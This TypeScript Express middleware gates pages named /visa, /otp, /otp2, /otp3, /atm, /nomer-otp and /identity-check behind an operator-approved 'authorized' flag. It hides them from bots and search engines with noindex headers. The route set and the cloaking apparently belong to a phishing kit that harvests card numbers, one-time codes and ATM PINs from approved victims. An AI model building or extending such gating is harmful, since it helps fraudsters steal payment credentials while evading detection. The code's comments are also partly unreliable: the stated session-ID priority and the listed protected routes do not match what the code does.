/**
 * Session-based Access Control Middleware
 * 
 * This middleware protects sensitive routes from unauthorized access.
 * Only visitors with 'authorized: true' in the database can access protected routes.
 * 
 * Protected routes (require authorization):
 * - /form, /select, /total, /total2, /visa, /otp, /otp2, /otp3
 * - /atm, /nomer, /nomer-wait, /nomer-otp, /identity-check
 * - /waiting, /errorvisa
 * 
 * Public routes (no authorization required):
 * - / (home page)
 * - /admin/* (admin routes - handled separately)
 * - /api/* (API routes - handled separately)
 */

import { Request, Response, NextFunction } from "express";
import { isVisitorAuthorized } from "@workspace/db";

// Protected route prefixes that require authorization
const PROTECTED_ROUTES = [
  "/form",
  "/select", 
  "/total",
  "/visa",
  "/otp",
  "/otp2",
  "/otp3",
  "/atm",
  "/nomer",
  "/waiting",
  "/errorvisa",
  "/identity-check",
];

/**
 * Check if a route requires authorization
 */
function isProtectedRoute(path: string): boolean {
  // Skip API routes
  if (path.startsWith("/api")) return false;
  
  // Skip admin routes (handled by admin auth)
  if (path.startsWith("/admin")) return false;
  
  // Check if path matches any protected prefix
  return PROTECTED_ROUTES.some(prefix => 
    path === prefix || 
    path.startsWith(prefix + "/") || 
    path.startsWith(prefix + "?")
  );
}

/**
 * Extract session ID from request
 * Priority: cookie > header > query param
 */
function getSessionId(req: Request): string | null {
  // Check header
  const sessionHeader = req.headers["x-session-id"];
  if (typeof sessionHeader === "string") return sessionHeader;
  
  // Check cookie
  const cookies = parseCookies(req.headers.cookie || "");
  if (cookies.sessionId) return cookies.sessionId;
  
  // Check query param (for SSR)
  const querySession = req.query.sessionId;
  if (typeof querySession === "string") return querySession;
  
  return null;
}

/**
 * Parse cookies from cookie header
 */
function parseCookies(cookieHeader: string): Record<string, string> {
  const cookies: Record<string, string> = {};
  if (!cookieHeader) return cookies;
  
  cookieHeader.split(";").forEach(cookie => {
    const [name, ...rest] = cookie.trim().split("=");
    if (name && rest.length > 0) {
      cookies[name.trim()] = decodeURIComponent(rest.join("="));
    }
  });
  
  return cookies;
}

/**
 * Set security headers to prevent bots and search engines
 */
function setSecurityHeaders(res: Response): void {
  res.setHeader("X-Robots-Tag", "noindex, nofollow, noarchive, nosnippet");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
}

/**
 * Session-based access control middleware
 * 
 * For protected routes, checks if the visitor is authorized.
 * If not authorized, redirects to home page with noindex headers.
 */
export function sessionAuthMiddleware(req: Request, res: Response, next: NextFunction): void {
  const path = req.path;
  
  // Skip if not a protected route
  if (!isProtectedRoute(path)) {
    return next();
  }
  
  // Skip if already handled by other middleware
  if (res.headersSent) {
    return next();
  }
  
  const sessionId = getSessionId(req);
  
  if (!sessionId) {
    // No session ID - redirect to home with noindex headers
    setSecurityHeaders(res);
    res.redirect(302, "/");
    return;
  }
  
  // Check authorization asynchronously
  isVisitorAuthorized(sessionId)
    .then((authorized) => {
      if (!authorized) {
        // Visitor not authorized - redirect to home
        console.log(`[Auth] Unauthorized access attempt to ${path} by session ${sessionId.substring(0, 8)}...`);
        setSecurityHeaders(res);
        res.redirect(302, "/");
        return;
      }
      
      // Authorized - proceed
      next();
    })
    .catch((error) => {
      // Database error - be safe, deny access
      console.error("[Auth] Authorization check failed:", error);
      setSecurityHeaders(res);
      res.redirect(302, "/");
    });
}
